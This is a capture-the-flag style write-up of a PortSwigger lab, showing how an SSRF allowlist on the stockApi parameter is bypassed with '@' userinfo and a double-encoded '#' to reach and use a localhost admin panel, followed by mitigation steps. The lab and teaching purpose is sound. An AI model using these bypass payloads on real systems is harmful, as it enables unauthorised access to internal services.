# PortSwigger Lab: SSRF with whitelist-based input filter

## Lab Description
- **Platform:** PortSwigger Web Security Academy
- **Difficulty:** Expert
- **Objective:** Change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`. The developer has deployed a strong anti-SSRF defense that needs to be bypassed.

## Vulnerability Analysis
The application uses an allowlist to restrict the `stockApi` parameter to the specific hostname `stock.weliketoshop.net`. Any other hostname is blocked.

However, the URL parser can be tricked into interpreting a URL as belonging to the allowlisted host, while the actual request is redirected to the internal `localhost`. This is achieved by exploiting the difference between how the filter parses the URL and how the underlying HTTP client parses it.

## Exploitation Steps
1. Attempted to access the admin panel using a standard payload (`stockApi=http://localhost/admin`), which was blocked by the filter with the message: `"External stock check host must be stock.weliketoshop.net"`.
2. Bypassed the filter by using the `@` symbol to include the trusted host in the URL, while directing the request to `localhost`:
   ```javascript
   fetch('/product/stock', {
     method: 'POST',
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
     body: 'stockApi=http://stock.weliketoshop.net@localhost/admin'
   })
   .then(r => r.text())
   .then(t => console.log(t));
   ```
   This returned a `500 Internal Server Error` containing the HTML of the admin panel, confirming the bypass.
3. To delete the user `carlos`, used a double URL-encoded `#` (`%2523`) to ensure the path `/admin/delete?username=carlos` was processed correctly by the server while still passing the filter:
   ```javascript
   fetch('/product/stock', {
     method: 'POST',
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
     body: 'stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos'
   })
   .then(r => r.text())
   .then(t => console.log(t));
   ```
4. The user was deleted, and the lab was solved.

## Evidence

### Bypass Filter (Admin Panel Access)
![SSRF Whitelist Bypass](screenshots/15-ssrf-whitelist-bypass.png)

### Delete Request (Double Encoding)
![SSRF Whitelist Delete](screenshots/16-ssrf-whitelist-bypass.png)

### Lab Solved
![SSRF Whitelist Solved](screenshots/17-ssrf-whitelist-solved.png)

## Mitigation
To prevent this bypass, the application must use a robust URL parser and strictly validate the final destination.
1. **Parse and Validate Final URL:** Parse the URL and verify that the hostname exactly matches the allowlist, without relying on string matching.
2. **Disable URL Features:** Disallow complex URL features like userinfo (`@`) and fragments (`#`) if they are not needed.
3. **Network-Level Protection:** Block outgoing requests from the server to internal IPs (`localhost`, `127.0.0.1`) using a firewall or network policy.